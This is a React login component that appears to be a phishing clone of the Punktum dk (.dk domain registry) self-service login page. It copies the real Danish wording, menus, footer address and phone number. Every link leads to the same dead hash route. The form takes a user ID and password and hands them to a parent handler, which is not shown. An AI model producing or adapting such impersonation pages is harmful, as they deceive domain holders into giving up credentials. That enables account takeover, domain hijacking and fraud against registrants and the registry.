import React, { useState } from 'react';
import './LoginScreen.css';

function LoginScreen({ loginName, errors, isLoading, onInputChange, onLogin }) {
  const [password, setPassword] = useState('');
  const [isHovered, setIsHovered] = useState(false);

  const handleSubmit = (e) => {
    e.preventDefault();

    if (!loginName || loginName.trim() === '') {
      alert('Please enter your Bruger-id');
      return;
    }
    if (!password || password.trim().length < 4) {
      alert('Adgangskode must be at least 4 characters');
      return;
    }

    // Pass values directly so parent doesn't rely on async state
    onLogin(null, loginName.trim(), password.trim());
  };

  return (
    <div className="punktum-page">
      <div className="punktum-top-bar">
        <div className="punktum-top-bar-inner">
          <ul className="punktum-top-menu">
            <li><a href="#/domain-login">PUNKTUM DK</a></li>
            <li className="divider">|</li>
            <li><a href="#/domain-login">STATISTIK</a></li>
            <li className="divider">|</li>
            <li><a href="#/domain-login">ENGLISH</a></li>
            <li className="punktum-login-link"><a href="#/domain-login">LOG AF</a></li>
          </ul>
        </div>
      </div>

      <header className="punktum-header">
        <div className="punktum-header-inner">
          <a href="#/domain-login" className="punktum-logo"></a>
        </div>
      </header>

      <div className="punktum-main-nav">
        <div className="punktum-main-nav-inner">
          <ul>
            <li className="active"><a href="#/domain-login">Bruger-id | E-mail | domænenavn</a></li>
            <li><a href="#/domain-login">MitID | E-mail | EU eID</a></li>
            <li><a href="#/domain-login">Betal faktura</a></li>
          </ul>
          <div className="punktum-help-link">
            <a href="#/domain-login">Brug for hjælp <span className="punktum-icon-help">?</span></a>
          </div>
        </div>
      </div>

      <main className="punktum-main">
        <div className="punktum-tabs">
          <div className="punktum-tab-content active">
            <div className="punktum-form-box">
              <form onSubmit={handleSubmit} noValidate>
                <div className="punktum-field">
                  <label htmlFor="username">Bruger-id | E-mail | domænenavn</label>
                  <div
                    className="punktum-tooltip-wrapper"
                    onMouseEnter={() => setIsHovered(true)}
                    onMouseLeave={() => setIsHovered(false)}
                  >
                    <span className="punktum-icon-info">i</span>
                    {isHovered && (
                      <div className="punktum-tooltip">
                        <p>Du kan for eksempel finde dit bruger-id på din faktura.</p>
                        <p>Eksempel på bruger-id: XXX12345-DK</p>
                      </div>
                    )}
                  </div>
                  <input
                    type="text"
                    id="username"
                    name="username"
                    value={loginName || ''}
                    onChange={(e) => onInputChange('loginName', e.target.value)}
                    autoFocus
                  />
                </div>

                <div className="punktum-field">
                  <label htmlFor="password">Adgangskode</label>
                  <input
                    type="password"
                    id="password"
                    name="password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                  />
                </div>

                <div className="punktum-form-actions">
                  <button type="submit" className="punktum-btn-login" disabled={isLoading}>
                    {isLoading ? 'Please wait…' : 'Log på'}
                  </button>
                  <a href="#/domain-login" className="punktum-forgot-link">Hjælp til login</a>
                </div>

                <p className="punktum-info-text">
                  Bemærk venligst, at bruger-id'et bliver blokeret i 24 timer, hvis du
                  indtaster forkert adgangskode 5 gange.
                </p>
              </form>
            </div>

            <div className="punktum-info-box">
              <h2>Velkommen til .dk-selvbetjening</h2>
              <p>Angiv bruger-id og adgangskode i venstre side for at logge på .dk selvbetjening.</p>
              <p>I vores .dk-selvbetjening har du mulighed for at foretage handlinger vedrørende dit domænenavn.</p>
              <p>Du kan f.eks. aktivere, overdrage til en ny registrant, opsige, skifte navneservere, foretage betalinger og skifte roller for dit domænenavn samt holde dine kontaktoplysninger opdateret.</p>
            </div>
          </div>
        </div>

        <div className="punktum-features">
          <div className="punktum-restore-box">
            <h2>Genopret et suspenderet .dk-domænenavn</h2>
            <div className="punktum-restore-form">
              <form onSubmit={(e) => e.preventDefault()}>
                <input type="text" placeholder="domænenavn.dk" name="restore.domain" />
                <button type="submit" className="punktum-btn-search">Søg</button>
              </form>
            </div>
            <p>Her kan du genoprette et suspenderet domænenavn, hvis du har glemt at betale periodegebyr.</p>
          </div>
        </div>
      </main>

      <footer className="punktum-footer">
        <div className="punktum-footer-inner">
          <div className="punktum-footer-box">
            <h3>Punktum dk A/S</h3>
            <p>Punktum dk er administrator for domænenavne, der ender på .dk.</p>
            <p>Det betyder, at alle .dk-domænenavne er registreret hos os, og at vi har stamoplysninger på alle, der har registreret et .dk-domænenavn.</p>
          </div>
          <div className="punktum-footer-box">
            <h3>Kontakt os</h3>
            <p><strong>Punktum dk A/S</strong><br />Ørestads Boulevard 108, 11. sal<br />2300 København S</p>
            <p>Tlf +45 33 64 60 60</p>
            <p><a href="#/domain-login">Ofte stillede spørgsmål og svar</a></p>
          </div>
          <div className="punktum-footer-box">
            <h3>Information</h3>
            <ul>
              <li><a href="#/domain-login">Punktum dk's hjemmeside</a></li>
              <li><a href="#/domain-login">Vilkår</a></li>
              <li><a href="#/domain-login">Persondatapolitik</a></li>
              <li><a href="#/domain-login">Cookie information</a></li>
            </ul>
          </div>
        </div>
      </footer>
    </div>
  );
}

export default LoginScreen;